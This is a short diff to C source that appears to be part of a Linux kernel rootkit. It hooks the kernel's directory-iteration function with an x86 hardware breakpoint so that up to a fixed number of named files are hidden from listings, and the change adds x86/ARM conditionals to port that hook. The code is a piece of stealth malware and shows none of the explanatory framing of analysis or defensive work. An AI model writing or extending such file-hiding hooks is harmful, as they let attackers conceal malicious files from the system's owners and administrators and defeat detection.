@@ -1,7 +1,7 @@
+#include <anima/arch.h>
 #include <anima/ksyms.h>
 #include <anima/libc.h>
 #include <anima/vfs.h>
-#include <anima/x86.h>
 
 #define MAX_HIDDEN_FILES 50
 #define FILENAME_SIZE	 50
@@ -37,7 +37,11 @@ static int new_filldir(void *__buf, const char *name, int namlen, loff_t offset,
 
 static void iterate_dir_hook(struct pt_regs *regs)
 {
+#if ARCH_X86
 	struct __dir_context *ctx = (struct __dir_context *)regs->si;
+#elif ARCH_ARM
+	struct __dir_context *ctx = NULL;
+#endif
 
 	/*
 	 * FIXME: should disable preemption ?
@@ -104,6 +108,8 @@ void vfs_hook(void)
 	if (!iterate_dir_p)
 		return;
 
+#if ARCH_X86
 	x86_hw_breakpoint_register(1, iterate_dir_p, DR_RW_EXECUTE,
 					0, iterate_dir_hook);
+#endif
 }
